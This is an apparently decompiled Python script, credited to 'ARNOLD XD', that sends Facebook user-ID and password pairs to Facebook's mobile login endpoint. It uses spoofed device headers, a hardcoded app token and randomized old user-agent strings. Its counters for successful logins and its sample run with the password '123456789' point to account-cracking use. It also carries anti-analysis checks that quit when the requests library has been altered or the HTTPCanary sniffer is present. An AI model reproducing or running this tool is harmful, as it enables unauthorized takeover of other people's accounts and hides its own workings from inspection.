# -*- coding: utf-8 -*-
# Decompiled from Python 3.12 bytecode
#ARNOLD XD & RIZWAN &ITZ CHUZA
import os
import re
import time
import uuid
import hashlib
import random
import string
import requests
import sys
import json
import urllib
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from os import system
from datetime import datetime
import sys

file_name = "res.txt"
sys.stdout.write('\x1b]2; ARNOLD 🔥 \x07')

# Suppress InsecureRequestWarning
from requests.exceptions import ConnectionError
from requests import api, models, sessions
requests.urllib3.disable_warnings()

# --- Anti-tampering and Security Checks ---
# The script checks if the source code of the 'requests' library has been modified
# or if packet sniffing tools are being used.
try:
    api_body = open(api.__file__, 'r').read()
    models_body = open(models.__file__, 'r').read()
    session_body = open(sessions.__file__, 'r').read()
    word_list = ['print', 'lambda', 'zlib.decompress']
    for word in word_list:
        if word in api_body or word in models_body or word in session_body:
            exit()
except:
    pass


class sec:
    """
    A security class to detect debugging and packet sniffing tools.
    """
    def __init__(self):
        self.__module__ = __name__
        self.__qualname__ = 'sec'
        # Paths to check for modifications
        paths = [
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/sessions.py',
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/api.py',
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/models.py'
        ]
        for path in paths:
            if 'print' in open(path, 'r').read():
                self.fuck()
        # Check for HTTPCanary (a packet sniffing app)
        if os.path.exists('/storage/emulated/0/x8zs/app_icon/com.guoshi.httpcanary.png'):
            self.fuck()
        if os.path.exists('/storage/emulated/0/Android/data/com.guoshi.httpcanary'):
            self.fuck()

    def fuck(self):
        """
        Terminates the script if tampering is detected.
        """
        print(' \x1b[1;32m Congratulations ! ')
        self.linex()
        exit()

    def linex(self):
        print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')


# Global variables
method = []
oks = []
cps = []
loop = 0
user = []

# Color codes for terminal output
X = '\x1b[1;37m'
rad = '\x1b[38;5;196m'
G = '\x1b[38;5;46m'
Y = '\x1b[38;5;220m'
PP = '\x1b[38;5;203m'
RR = '\x1b[38;5;196m'
GS = '\x1b[38;5;40m'
W = '\x1b[1;37m'


import random

def windows():
    """
    Generates a random Windows User-Agent string.
    Covers 2010–2025 (Chrome 8 → Chrome 139).
    """
    # Early Chrome (2010–2011, Windows XP/7)
    aV = str(random.choice(range(10, 20)))
    A = (
        f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) "
        f"AppleWebKit/534.{aV} (KHTML, like Gecko) "
        f"Chrome/{str(random.choice(range(8, 15)))}.0.{str(random.choice(range(500, 1200)))}.0 "
        f"Safari/534.{aV}"
    )

    # Mid-era Chrome (2012–2014, Windows 7/8)
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = (
        f"Mozilla/5.0 (Windows NT {str(random.choice(range(6, 7)))}.{str(random.choice(['0', '1', '2']))}) "
        f"AppleWebKit/{bz} (KHTML, like Gecko) "
        f"Chrome/{str(random.choice(range(20, 45)))}.0.{str(random.choice(range(1200, 2800)))}.{str(random.choice(range(1, 150)))} "
        f"Safari/{bz}"
    )

    # Transition era (2015–2017, WOW64 builds)
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = (
        f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['1', '2', '3']))}; WOW64) "
        f"AppleWebKit/{cz} (KHTML, like Gecko) "
        f"Chrome/{str(random.choice(range(45, 70)))}.0.{str(random.choice(range(2800, 5000)))}.{str(random.choice(range(50, 200)))} "
        f"Safari/{cz}"
    )

    # Modern Chrome (2021–2025, Windows 10/11)
    latest_build = random.randint(6000, 9000)
    latest_patch = random.randint(50, 200)
    D = (
        f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) "
        f"AppleWebKit/537.36 (KHTML, like Gecko) "
        f"Chrome/{random.choice(range(100, 139))}.0.{latest_build}.{latest_patch} "
        f"Safari/537.36"
    )

    return random.choice([A, B, C, D])


def window11():
    """
    Generates another variant of a random Windows User-Agent string.
    """
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(['0', '1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{random.choice(['0', '1', '2'])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{cz}"
    latest_build = rr(6000, 9000)
    latest_patch = rr(100, 200)
    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
    return random.choice([A, B, C, D])

def window21():
    """
    Generates another variant of a random Windows User-Agent string.
    Covers 2010–2025 era (Chrome 40 to 139).
    Each UA matches realistic year-specific NT and Chrome versions.
    """

    # Old WebKit/Chrome (2010–2013) → Windows 7 + Chrome 40–49
    aV = str(random.choice(range(10, 20)))
    A = (
        f"Mozilla/5.0 (Windows NT 6.1; WOW64) "
        f"AppleWebKit/534.{aV} (KHTML, like Gecko) "
        f"Chrome/{random.choice(range(40, 50))}.0.{random.choice(range(2000, 4000))}.0 "
        f"Safari/534.{aV}"
    )

    # Mid-era Chrome (2014–2016) → Windows 8/8.1 + Chrome 50–69
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f"5{bx}.{bV}"
    B = (
        f"Mozilla/5.0 (Windows NT {random.choice(['6.2', '6.3'])}; WOW64) "
        f"AppleWebKit/{bz} (KHTML, like Gecko) "
        f"Chrome/{random.choice(range(50, 70))}.0.{random.choice(range(3000, 5000))}.{random.choice(range(50, 200))} "
        f"Safari/{bz}"
    )

    # Transition era (2017–2020) → Windows 10 + Chrome 70–89
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f"5{cx}.{cV}"
    C = (
        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        f"AppleWebKit/{cz} (KHTML, like Gecko) "
        f"Chrome/{random.choice(range(70, 90))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} "
        f"Safari/{cz}"
    )

    # Modern Chrome (2021–2025) → Windows 10/11 + Chrome 100–139
    latest_build = random.randint(6000, 9000)
    latest_patch = random.randint(100, 200)
    D = (
        f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) "
        f"AppleWebKit/537.36 (KHTML, like Gecko) "
        f"Chrome/{random.choice(range(100, 139))}.0.{latest_build}.{latest_patch} "
        f"Safari/537.36"
    )

    return random.choice([A, B, C, D])

import random

def arnold_2008():
    """
    Special: Windows + Early Browsers (2008 era, FB old IDs).
    Covers XP/Vista + IE7/8, Firefox 2/3, Chrome 1–2, Safari 3/4.
    """
    nt = random.choice(["5.1", "6.0"])  # XP, Vista

    # IE7/8
    ie_ver = random.choice(["7.0", "8.0"])
    A = f"Mozilla/4.0 (compatible; MSIE {ie_ver}; Windows NT {nt}; Trident/{'3.1' if ie_ver=='7.0' else '4.0'})"

    # Firefox 2–3
    ff_major = random.choice([2, 3])
    B = f"Mozilla/5.0 (Windows NT {nt}; rv:{ff_major}.0) Gecko/20071127 Firefox/{ff_major}.0"

    # Chrome 1–2
    chrome_ver = f"{random.randint(1,2)}.0.{random.randint(150, 300)}.{random.randint(0,99)}"
    C = f"Mozilla/5.0 (Windows; U; Windows NT {nt}; en-US) AppleWebKit/525.{random.randint(0,20)} " \
        f"(KHTML, like Gecko) Chrome/{chrome_ver} Safari/525.{random.randint(0,20)}"

    # Safari 3–4
    safari_ver = random.choice(["525.26", "528.16"])
    D = f"Mozilla/5.0 (Windows; U; Windows NT {nt}; en-US) AppleWebKit/{safari_ver} (KHTML, like Gecko) " \
        f"Version/{random.choice(['3.2','4.0'])} Safari/{safari_ver}"

    return random.choice([A, B, C, D])


def arnold_1():
    """
    Windows UA (2009–2016).
    Chrome 4–55, Firefox 3–50, IE 8–11.
    """
    chrome_ver = f"{random.randint(4, 55)}.0.{random.randint(200, 4200)}.{random.randint(0, 250)}"
    A = f"Mozilla/5.0 (Windows NT {random.choice(['5.1','6.0','6.1','6.2','6.3'])}; " \
        f"{random.choice(['en-US','en-GB','fr-FR','de-DE'])}) AppleWebKit/537.36 " \
        f"(KHTML, like Gecko) Chrome/{chrome_ver} Safari/537.36"

    ff_major = random.randint(3, 50)
    B = f"Mozilla/5.0 (Windows NT {random.choice(['5.1','6.0','6.1','6.2','6.3'])}; rv:{ff_major}.0) " \
        f"Gecko/20100101 Firefox/{ff_major}.0"

    ie_ver = random.choice(["8.0","9.0","10.0","11.0"])
    trident_map = {"8.0":"4.0","9.0":"5.0","10.0":"6.0","11.0":"7.0"}
    C = f"Mozilla/5.0 (compatible; MSIE {ie_ver}; Windows NT {random.choice(['5.1','6.1','6.3'])}; " \
        f"Trident/{trident_map[ie_ver]})"

    return random.choice([A, B, C])


def arnold_2():
    """
    Android UA (2010–2016).
    Popular Samsung, Nexus, HTC, LG, Sony, Micromax.
    """
    android_ver = random.choice([
        "2.3.6","4.0.4","4.1.2","4.2.2","4.3",
        "4.4.2","5.0.2","5.1.1","6.0.1"
    ])
    devices = [
        "GT-I9100","GT-I9300","GT-N7100","GT-I9500","SM-G900F","SM-G920F","SM-N9005",
        "Nexus 4","Nexus 5","Nexus 7","Nexus 10",
        "HTC One X","HTC One M7","HTC One M8",
        "LG-P990","LG-D802","LG-H815",
        "Xperia Z","Xperia Z1","Xperia Z2","Xperia Z3","Xperia Z5",
        "Micromax A110","Micromax A116"
    ]
    device = random.choice(devices)
    chrome_ver = f"{random.randint(18, 55)}.0.{random.randint(800, 4200)}.{random.randint(0, 300)}"

    return f"Mozilla/5.0 (Linux; Android {android_ver}; {device}) " \
           f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ver} Mobile Safari/537.36"


def arnold_3():
    """
    iOS UA (2010–2016).
    iPhone/iPad/iPod Safari builds.
    """
    ios_ver = random.choice([
        "4_3_5","5_1_1","6_1_6","7_1_2","8_4","9_3_5","10_3_3"
    ])
    devices = ["iPhone","iPad","iPod touch"]
    device = random.choice(devices)

    safari_map = {
        "4_3_5": ("533.17.9","5.0"),
        "5_1_1": ("534.46","5.1"),
        "6_1_6": ("536.26","6.0"),
        "7_1_2": ("537.51.2","7.0"),
        "8_4":   ("600.1.4","8.0"),
        "9_3_5": ("601.1","9.0"),
        "10_3_3":("603.3.8","10.0"),
    }
    safari_ver, version_str = safari_map[ios_ver]

    return f"Mozilla/5.0 ({device}; CPU {device} OS {ios_ver} like Mac OS X) " \
           f"AppleWebKit/{safari_ver} (KHTML, like Gecko) Version/{version_str} Mobile/14G60 Safari/{safari_ver}"


def arnold_all():
    """
    Random UA (2008–2016) across Windows, Android, iOS.
    """
    return random.choice([arnold_2008(), arnold_1(), arnold_2(), arnold_3()])


def login_1(uid, pw):
    """
    Login attempt method 1 with enhanced cookie capture and saving.
    """
    global loop, oks  # Assuming 'oks' is a global list defined elsewhere
    session = requests.session()
    try:
        sys.stdout.write(
            f"\r\r\x1b[38;5;195m[\x1b[1;37mARNOLD-XD\x1b[38;5;195m]"
            f"\x1b[38;5;196m•\x1b[38;5;192m{loop}\x1b[38;5;195m|\x1b[38;5;195m|"
            f"\x1b[1;37mOK\x1b[38;5;195m|\x1b[38;5;195m|"
            f"\x1b[38;5;192m{len(oks)}"
        )
        sys.stdout.flush()
        data = {
            'adid': str(uuid.uuid4()),
            'format': 'json',
            'device_id': str(uuid.uuid4()),
            'cpl': 'true',
            'family_device_id': str(uuid.uuid4()),
            'credentials_type': 'device_based_login_password',
            'error_detail_type': 'button_with_disabled',
            'source': 'device_based_login',
            'email': str(uid),
            'password': str(pw),
            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'generate_session_cookies': '1',
            'meta_inf_fbmeta': '',
            'advertiser_id': str(uuid.uuid4()),
            'currently_logged_in_userid': '0',
            'locale': 'en_US',
            'client_country_code': 'US',
            'method': 'auth.login',
            'fb_api_req_friendly_name': 'authenticate',
            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
            'api_key': '882a8490361da98702bf97a021ddc14d'
        }
        headers = {
            'User-Agent': arnold_all(),  
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'graph.facebook.com',
            'X-FB-Net-HNI': '25227',
            'X-FB-SIM-HNI': '29752',
            'X-FB-Connection-Type': 'MOBILE.LTE',
            'X-Tigon-Is-Retry': 'False',
            'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
            'x-fb-device-group': '5120',
            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags': 'graphservice',
            'X-FB-HTTP-Engine': 'Liger',
            'X-FB-Client-IP': 'True',
            'X-FB-Server-Cluster': 'True',
            'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
        }
        res = session.post(
            'https://b-graph.facebook.com/auth/login',
            data=data,
            headers=headers,
            allow_redirects=False
        ).json()

        print(res)

        loop += 1
    except:
        time.sleep(5)

if __name__ == '__main__':
    uid = "100004305306407"
    pw = "123456789"
    login_1(uid, pw)
